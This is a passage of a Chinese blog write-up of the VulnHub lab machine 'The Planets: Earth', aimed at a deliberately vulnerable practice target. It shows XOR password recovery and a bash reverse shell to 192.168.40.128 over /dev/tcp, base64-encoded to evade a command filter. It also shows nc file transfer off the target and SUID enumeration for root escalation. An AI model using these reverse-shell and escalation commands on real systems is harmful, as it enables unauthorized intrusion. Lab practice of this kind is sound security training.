+<p>terra 用作 admin portal 的用户名，</p>
+<p>根据提示，在<a target="_blank" rel="noopener" href="https://terratest.earth.local/testdata.txt">https://terratest.earth.local/testdata.txt</a>中找到了信息，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118212715638.png" alt="image-20241118212715638" data-caption="image-20241118212715638" loading="lazy"></p>
+<p>猜测可能与密钥有关，一开始用testdata.txt内容进行解码，发现是乱码，想了很久，xor需要两个内容为二进制且长度一致，所以将Previous Messages进行16进制转2进制，testdata.txt中的内容字符串转二进制，最后结果转换为字符串。python脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def hex_to_binary(hex_data):</span><br><span class="line">    binary_data = bin(int(hex_data, 16))[2:]  </span><br><span class="line">    return binary_data.zfill(len(hex_data) * 4)                #将十六进制字符串转换为二进制字符串</span><br><span class="line">​</span><br><span class="line">def string_to_binary(string_data):</span><br><span class="line">    return &#x27;&#x27;.join(format(ord(char), &#x27;08b&#x27;) for char in string_data)  #将字符串转换为二进制字符串</span><br><span class="line">​</span><br><span class="line">def binary_to_string(binary_data):</span><br><span class="line">    chars = [chr(int(binary_data[i:i + 8], 2)) for i in range(0, len(binary_data), 8)]</span><br><span class="line">    return &#x27;&#x27;.join(chars)                                       #将二进制字符串转换为普通字符串</span><br><span class="line">​</span><br><span class="line">def xor_binary(binary1, binary2):</span><br><span class="line">    if len(binary1) != len(binary2):</span><br><span class="line">        raise ValueError(&quot;二进制数据长度必须一致！&quot;)</span><br><span class="line">    return &#x27;&#x27;.join(&#x27;1&#x27; if b1 != b2 else &#x27;0&#x27; for b1, b2 in zip(binary1, binary2))   #对两个二进制字符串进行异或操作</span><br><span class="line">​</span><br><span class="line">hex_data = &quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;  # 十六进制字符串</span><br><span class="line">string_data = &quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot; </span><br><span class="line">​</span><br><span class="line">binary1 = hex_to_binary(hex_data)</span><br><span class="line">binary2 = string_to_binary(string_data)</span><br><span class="line">min_length = min(len(binary1), len(binary2))</span><br><span class="line">binary1 = binary1[:min_length]</span><br><span class="line">binary2 = binary2[:min_length]</span><br><span class="line">xor_result = xor_binary(binary1, binary2)</span><br><span class="line">key_string = binary_to_string(xor_result)</span><br><span class="line">print(&quot;XOR 异或结果（密钥）字符串:&quot;, key_string)</span><br></pre></td></tr></table></figure>
+
+<p>得到异或后的结果，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>
+
+<p>一看为一些重复的英文：earthclimatechangebad4humans；且根据提示terra 用作 admin portal 的用户名，猜测解出的内容是password，返回<a target="_blank" rel="noopener" href="http://earth.local/admin/login">http://earth.local/admin/login</a>尝试登录，登录成功，进入了执行命令界面。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119204457789.png" alt="image-20241119214447262" data-caption="image-20241119214447262" loading="lazy"></p>
+<p>ls查看一下目录，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119215551441.png" alt="image-20241119215551441" data-caption="image-20241119215551441" loading="lazy"></p>
+<p>找了半天不知道flag在哪里，想到可以直接查带flag名的文件，用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119215956610.png" alt="image-20241119215956610" data-caption="image-20241119215956610" loading="lazy"></p>
+<p>查找到很多文件，cat读取一些可疑的文件，看见一个与众不同的路径，且是txt文件，很有可能是flag，于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/scsi_mod/parameters/default_dev_flags /var/earth_web/user_flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到了第一个flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241120103304813.png" alt="image-20241120103304813" data-caption="image-20241120103304813" loading="lazy"></p>
+<p>接下来就要进行反弹shell，本想用bash直接反弹，bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.40.123&#x2F;2333 0&gt;&amp;1，但是被禁止远程连接</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241120112345063.png" alt="image-20241120112345063" data-caption="image-20241120112345063" loading="lazy"></p>
+<p>不知道是过滤了什么，用base64将命令进行编码试一下，成功反弹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.40.128/1332 0&gt;&amp;1</span><br><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQwLjEyOC81MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121200641890.png" alt="image-20241121200641890" data-caption="image-20241121200641890" loading="lazy"></p>
+<p>接下来就是进行提权，先尝试用suid进行提权，先查找具有root权限的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121202348577.png" alt="image-20241121202348577" data-caption="image-20241121202348577" loading="lazy"></p>
+<p>先cat了一下&#x2F;usr&#x2F;sbin&#x2F;grub2-set-bootflag，发现是一个乱码文件，找找命令看能不能格式化，用strings命令，发现没有什么信息，于是再看看其他文件，看到一个文件重置root？cat &#x2F;usr&#x2F;bin&#x2F;reset_root看看，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121203432036.png" alt="image-20241121203432036" data-caption="image-20241121203432036" loading="lazy"></p>
+<p>是一个可以运行的代码，也许能重置root权限，运行一下，报错了</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121204123361.png" alt="image-20241121204123361" data-caption="image-20241121204123361" loading="lazy"></p>
+<p>运行不了，但是不知道是什么原因，将文件再传到kali上，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1332 &gt;reset_root</span><br><span class="line">nc 192.168.40.128 1332 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121214814724.png" alt="image-20241121214814724" data-caption="image-20241121214814724" loading="lazy"></p>
+<p>再通过strace工具进行调试，但是发现运行时没有权限，于是添加运行权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /home/it12345/桌面/reset_root</span><br></pre></td></tr></table></figure>
+
+<p>再进行调试就成功了</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215040000.png" alt="image-20241121215040000" data-caption="image-20241121215040000" loading="lazy"></p>
+<p>成功找到报CHECKING IF RESET TRIGGERS PRESENT…RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.这个错误的原因，在靶机中添加三个文件，再运行reset_root文件，成功得到root用户密码为Earth</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215603323.png" alt="image-20241121215603323" data-caption="image-20241121215603323" loading="lazy"></p>
+<p>切换一下用户，su切换，成功得到root权限</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215951124.png" alt="image-20241121215951124" data-caption="image-20241121215951124" loading="lazy"></p>
+<p>访问一下我们无法访问的root目录，找到一个root_flag.txt文件，cat一下，得到最终flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121220634647.png" alt="image-20241121220634647" data-caption="image-20241121220634647" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>Happ3n<br>
+        
+        <strong>本文链接：</strong><a href="https://itwillhappen.github.io/2024/12/06/vulnhub-%E9%9D%B6%E6%9C%BA-ThePlanetsEarth/" title="https:&#x2F;&#x2F;itwillhappen.github.io&#x2F;2024&#x2F;12&#x2F;06&#x2F;vulnhub-%E9%9D%B6%E6%9C%BA-ThePlanetsEarth&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;itwillhappen.github.io&#x2F;2024&#x2F;12&#x2F;06&#x2F;vulnhub-%E9%9D%B6%E6%9C%BA-ThePlanetsEarth&#x2F;</a><br>
+
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1773566656214"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          <div class="valine"></div>
+<script src='https://lib.baomitu.com/valine/1.3.9/Valine.min.js'></script>
+<script>
+  new Valine({
+      el: '.valine',
+      appId: 'r5zxC0st0DDjPA9auXzMV7HY-gzGzoHsz',
+      appKey: '3bqCsovpyfTPHUzTHovd3V3V'
+  })
+</script>
+
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BAThe-Planets-Earth"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶机The Planets: Earth</span></a></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-pendant"><div class="nexmoe-drawer  nexmoe-pd" id="drawer" style="overflow-x: auto;overflow-y: auto;">
+
+     
+        
+
+        <div class="nexmoe-pd-item">
+    <div class="clock">
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="needle" id="hours"></div>
+        <div class="needle" id="minutes"></div>
+        <div class="needle" id="seconds"></div>
+        <div class="clock_logo">
+
+        </div>
+
+    </div>
+</div>
+<script>
+    // ----- Variable declaration
+
+    var data = {
+        dt: new Date(),
+        hours: {
+            el: document.querySelector('#hours'),
+            val: 0
+        },
+
+        minutes: {
+            el: document.querySelector('#minutes'),
+            val: 0
+        },
+
+        seconds: {
+            el: document.querySelector('#seconds'),
+            val: 0
+        },
+
+        renderTime: 1000
+    };
+
+
+    // ----- Clock rendering logic
+
+    updateTime = () => {
+        let hour = data.dt.getHours();
+        let minute = data.dt.getMinutes();
+        let second = data.dt.getSeconds();
+
+        data.hours.el.classList.add('moving');
+        data.minutes.el.classList.add('moving');
+        data.seconds.el.classList.add('moving');
+
+        data.hours.val = hour == 0 && data.hours.val == 59 * 6 * 5 ? 360 : hour * 6 * 5;
+        data.minutes.val = minute == 0 && data.minutes.val == 59 * 6 ? 360 : minute * 6;
+        data.seconds.val = second == 0 && data.seconds.val == 59 * 6 ? 360 : second * 6;
+
+        data.hours.el.style.transform = `translate(-50%, -75%) rotate(${data.hours.val}deg)`;
+        data.minutes.el.style.transform = `translate(-50%, -75%) rotate(${data.minutes.val}deg)`;
+        data.seconds.el.style.transform = `translate(-50%, -75%) rotate(${data.seconds.val}deg)`;
+
+        data.dt.setSeconds(second + 1);
+    };
+
+    // ----- Clock execution
+
+    setInterval(() => {
+        updateTime();
+    }, data.renderTime);
+
+    updateTime();
+
+    // ----- Events area
+
+    data.seconds.el.addEventListener('transitionend', () => {
+        data.hours.el.classList.remove('moving');
+        data.minutes.el.classList.remove('moving');
+        data.seconds.el.classList.remove('moving');
+
+        // if (data.hours.val == 360) {
+        //   data.hours.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        // }
+
+        if (data.minutes.val == 360) {
+            data.minutes.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        }
+
+        if (data.seconds.val == 360) {
+            data.seconds.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        }
+    });
+
+</script>
+<style>
+    .clock {
+        background-color: #ffffff;
+        width: 70vw;
+        height: 70vw;
+        max-width: 70vh;
+        max-height: 70vh;
+        border: solid 2.8vw var(--color-primary);
+        position: relative;
+        overflow: hidden;
+        border-radius: 50%;
+        box-sizing: border-box;
+        box-shadow: 0 1.4vw 2.8vw var(--color2);
+        zoom: 0.2
+    }
+
+    .memory {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform-origin: center;
+    }
+
+    .memory:nth-child(1) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(0deg) translateY(-520%);
+    }
+
+    .memory:nth-child(2) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(6deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(3) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(12deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(4) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(18deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(5) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(24deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(6) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(30deg) translateY(-520%);
+    }
+
+    .memory:nth-child(7) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(36deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(8) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(42deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(9) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(48deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(10) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(54deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(11) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(60deg) translateY(-520%);
+    }
+
+    .memory:nth-child(12) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(66deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(13) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(72deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(14) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(78deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(15) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(84deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(16) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(90deg) translateY(-520%);
+    }
+
+    .memory:nth-child(17) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(96deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(18) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(102deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(19) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(108deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(20) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(114deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(21) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(120deg) translateY(-520%);
+    }
+
+    .memory:nth-child(22) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(126deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(23) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(132deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(24) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(138deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(25) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(144deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(26) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(150deg) translateY(-520%);
+    }
+
+    .memory:nth-child(27) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(156deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(28) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(162deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(29) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(168deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(30) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(174deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(31) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(180deg) translateY(-520%);
+    }
+
+    .memory:nth-child(32) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(186deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(33) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(192deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(34) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(198deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(35) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(204deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(36) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(210deg) translateY(-520%);
+    }
+
+    .memory:nth-child(37) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(216deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(38) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(222deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(39) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(228deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(40) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(234deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(41) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(240deg) translateY(-520%);
+    }
+
+    .memory:nth-child(42) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(246deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(43) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(252deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(44) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(258deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(45) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(264deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(46) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(270deg) translateY(-520%);
+    }
+
+    .memory:nth-child(47) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(276deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(48) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(282deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(49) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(288deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(50) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(294deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(51) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(300deg) translateY(-520%);
+    }
+
+    .memory:nth-child(52) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(306deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(53) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(312deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(54) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(318deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(55) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(324deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(56) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(330deg) translateY(-520%);
+    }
+
+    .memory:nth-child(57) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(336deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(58) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(342deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(59) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(348deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(60) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(354deg) translateY(-1461%);
+    }
+
+    .needle {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform-origin: center;
+    }
+
+    .needle#hours {
+        background-color: #1f1f1f;
+        width: 4%;
+        height: 30%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#hours.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#hours:after {
+        content: '';
+        background-color: #1f1f1f;
+        width: 4vw;
+        height: 4vw;
+        max-width: 4vh;
+        max-height: 4vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .needle#minutes {
+        background-color: #1f1f1f;
+        width: 2%;
+        height: 45%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#minutes.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#minutes:after {
+        content: '';
+        background-color: #1f1f1f;
+        width: 4vw;
+        height: 4vw;
+        max-width: 4vh;
+        max-height: 4vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .needle#seconds {
+        background-color: #cb2f2f;
+        width: 1%;
+        height: 50%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#seconds.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#seconds:after {
+        content: '';
+        background-color: #cb2f2f;
+        width: 2.5vw;
+        height: 2.5vw;
+        max-width: 2.5vh;
+        max-height: 2.5vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .clock_logo {
+        width: 10vw;
+        height: 10vw;
+        max-width: 10vh;
+        max-height: 10vh;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
